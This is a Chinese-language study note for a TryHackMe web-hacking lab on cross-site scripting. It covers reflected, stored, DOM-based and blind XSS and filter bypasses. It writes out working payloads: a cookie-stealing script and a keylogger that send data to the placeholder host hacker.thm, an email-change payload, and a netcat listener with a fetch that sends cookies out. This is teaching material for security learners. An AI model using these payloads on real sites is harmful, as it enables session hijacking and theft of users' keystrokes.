---
title: Intro_to_Cross-site_Scripting_跨站脚本
date: 2024-05-18 13:29:04
updated: 2026-04-13 14:03:41
tags:
  - 打靶
  - TryHackMe
  - Jr_Penetration_Tester
  - Introduction_to_Web_Hacking
---
# XSS Payloads

## **Proof Of Concept: 概念验证**

```javascript
<script>alert('XSS');</script>
```

## Session Stealing: 会话窃取

用户会话的详细信息（如登录令牌）通常保存在目标计算机上的 **cookie** 中。下面的 JavaScript 获取目标的 cookie，base64 对 cookie 进行编码以确保成功传输，然后将其发布到黑客控制的网站进行记录。一旦黑客拥有了这些 cookie，他们就可以接管目标的会话并记录为该用户。

```javascript
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

## **Key Logger: 键盘记录器**

```javascript
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

## **Business Logic: 业务逻辑**

此有效负载比上述示例更具体。这将是关于调用特定的网络资源或 JavaScript 函数。例如，假设一个用于更改用户电子邮件地址的 JavaScript 函数，称为 **user.changeEmail()** .有效负载可能如下所示：

```javascript
<script>user.changeEmail('attacker@hacker.thm');</script>
```

# Reflected XSS 反射型XSS

当 HTTP 请求中用户提供的数据包含在网页源中而不进行任何验证时，就会发生反射 XSS。

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716040496609-b1d553e6-b914-40bc-a09e-655956febcce.png)

攻击者可以向潜在受害者发送链接或将其嵌入到另一个包含 JavaScript 有效负载的 iframe 中，让他们在浏览器上执行代码，从而可能泄露会话或客户信息。

​  

**如何测试反射的 XSS：**​  
您需要测试每个可能的切入点;这些包括：

-   URL 查询字符串中的参数
-   URL 文件路径
-   有时是 HTTP 标头（尽管在实践中不太可能被利用）

找到一些反映在 Web 应用程序中的数据后，您需要确认可以成功运行 JavaScript 有效负载;有效负载将取决于代码在应用程序中的反映位置 。

# Stored XSS 存储型XSS

顾名思义，XSS 有效负载存储在 Web 应用程序上（例如，在数据库中），然后在其他用户访问站点或网页时运行。

**Example Scenario: 示例场景：**  
允许用户发表评论的博客网站。不幸的是，没有检查这些注释是否包含 JavaScript 或过滤掉任何恶意代码。如果我们现在发布包含 JavaScript 的评论，它将存储在数据库中，并且现在访问该文章的所有其他用户都将在他们的浏览器中运行 JavaScript。

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716040863435-35766412-09bf-48e4-8c92-e7a70c015625.png)

**如何测试存储的 XSS：**  
您需要测试每个可能的入口点，在这些入口点中，数据似乎被存储，然后显示在其他用户有权访问的区域中;其中的一个小例子可能是：​

-   博客上的评论
-   用户配置文件信息
-   Website Listings 网站列表

有时，开发人员认为在客户端限制输入值已经足够好了，因此将值更改为 Web 应用程序不期望的值是发现存储的 XSS 的良好来源，例如，期望从下拉菜单中显示整数的 age 字段，但相反，您可以手动发送请求，而不是使用允许您尝试恶意负载的表单。  
找到存储在 Web 应用程序中的一些数据后，您需要确认可以成功运行 JavaScript 有效负载;有效负载将取决于代码在应用程序中的反映位置

# **DOM Based XSS 基于DOM的XSS**

DOM 代表文档对象模型，是 HTML 和 XML 文档的编程接口。它表示页面，以便程序可以更改文档结构、样式和内容。网页是一个文档，此文档可以显示在浏览器窗口中，也可以作为 HTML 源显示。HTML DOM 的示意图如下所示：

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716050820494-3078cb2f-5e2d-4de3-bcc4-735dcba8ab52.png)  
如果您想了解有关 DOM 的更多信息并获得更深入的了解，[w3.org](https://w3.org) 拥有大量资源。

基于 DOM 的 XSS 是直接在浏览器中执行 JavaScript 的地方，无需加载任何新页面或将数据提交到后端代码。当网站 JavaScript 代码作用于输入或用户交互时，将发生执行。

**如何测试基于 Dom 的 XSS：**  
基于 DOM 的 XSS 测试起来可能具有挑战性，并且需要一定的 JavaScript 知识才能阅读源代码。您需要查找访问攻击者可以控制的某些变量的代码部分，例如“**window.location.x**”参数。

当你找到这些代码时，你需要看看它们是如何处理的，以及这些值是否被写入网页的 DOM 或传递给不安全的 JavaScript 方法，如 eval()。

# **Blind XSS 盲XSS**

Blind XSS 类似于存储的 XSS（我们在任务 4 中介绍过），因为您的有效负载存储在网站上供其他用户查看，但在这种情况下，您无法看到有效负载工作或无法先对自己进行测试。

**Potential Impact: 潜在影响：**  
使用正确的有效负载，攻击者的 JavaScript 可以回调攻击者的网站，显示员工门户 URL、员工的 cookie，甚至正在查看的门户页面的内容。现在，攻击者可能会劫持工作人员的会话并访问私人门户。**如何测试盲 XSS：**  
在测试 Blind XSS 漏洞时，您需要确保有效负载具有回调（通常是 HTTP 请求）。这样，您就知道是否以及何时执行代码。  
Blind XSS 攻击的流行工具是 **XSS Hunter Express**[GitHub - mandatoryprogrammer/xsshunter-express: An easy-to-setup version of XSS Hunter. Sets up in five minutes and requires no maintenance!](https://github.com/mandatoryprogrammer/xsshunter-express)。虽然可以在 JavaScript 中制作自己的工具，但此工具将自动捕获 cookie、URL、页面内容等。

# Perfecting your payload 完善您的payload

## 无过滤

`<script>alert('THM');</script>`

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716053036670-521f7406-8056-40b0-994a-3bf3b22aa0fb.png)

## 逃逸 input 标签

`"><script>alert('THM');</script>`

`">` 用来是关闭 value 参数，然后关闭 input 标签

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716053240703-4ea90d5e-f7ab-430f-8b91-ea8b5f55620c.png)

## 逃逸 textarea 标签

`</textarea><script>alert('THM');</script>`

`</textarea>` 使 textarea 元素关闭，以便脚本运行。

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716053385511-2a7b4df3-d927-4164-9327-14eb83d72726.png)

## 逃逸现有的 JavaScript 命令

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716053595088-30a22c42-a42c-4ebd-a808-af564b5d68d7.png)

`';alert('THM');//`

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716053563342-bd363187-d153-4d3c-bf41-b21110696296.png)

## 过滤 script

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716053941395-47da69c4-95c2-40b8-9ecf-f38731209118.png)

**原始有效载荷：**

`<sscriptcript>alert('THM');</sscriptcript>`

**要删除的文本（通过过滤器）：**

`<sscriptcript>alert('THM');</sscriptcript>`

**最终有效载荷（通过过滤器后）：**

`<script>alert('THM');</script>`

## 过滤 < > & 逃逸 IMG 标签

尝试`"><script>alert('THM');</script>`

发现 < 和 > 字符从我们的有效payload中被过滤掉，从而阻止我们转义 IMG 标签。

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716054240393-97c24c54-e2ed-46e5-8fae-160097fde61d.png)

为了绕过过滤器，我们可以利用 IMG 标签的其他属性，例如 **onload 事件**。一旦 src 属性中指定的图像加载到网页上，onload 事件就会执行您选择的代码。

`/images/cat.jpg" onload="alert('THM');`

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716054351362-87bf6850-1582-400d-a59b-37339f9ea53a.png)

# Practical Example (Blind XSS)

测试

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716085344075-d75808f4-cb4e-4960-878d-22a34a1059ff.png)  
![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716085361226-49c4d2c8-7929-437c-be04-f4fd0d953333.png)

逃逸成功

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716085378318-6f066e4d-34c5-4ca4-8294-117ff48b6708.png)​

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716085378500-92278f33-d30e-40ae-9690-98b62f4b3884.png)

测试`</textarea><script>alert('THM');</script>`成功

​  

让我们使用 Netcat 设置一个监听服务器。如果我们想侦听端口 9001，我们发出命令 `nc -l -p 9001` 。该 `-l` 选项表示我们希望在侦听模式下使用 Netcat，而该 `-p` 选项用于指定端口号。为了避免通过DNS解析主机名，我们可以添加 `-n` ;此外，要发现任何错误，建议通过添加 \`-v 选项在详细模式下运行 Netcat。最后的命令变为 nc -n -l -v -p 9001 ，等效于 `**nc -nlvp 9001**` 。

```plain
user@machine$ nc -nlvp 9001
Listening on [0.0.0.0] (family 0, port 9001)
```

  

**payload:**

`</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>`

> -   `fetch()` 命令发出 HTTP 请求。
> -   `URL_OR_IP` 是 THM 请求捕获器 URL、您在 THM AttackBox 中的 IP 地址或您在 THM VPN 网络上的 IP 地址。
> -   `PORT_NUMBER` 是用于侦听 AttackBox 上的连接的端口号。
> -   `?cookie=` 是包含受害者的 cookie 的查询字符串。
> -   `btoa()` 命令 base64 对受害者的 cookie 进行编码。
> -   `document.cookie` 访问受害者的 Acme IT 支持网站的 cookie。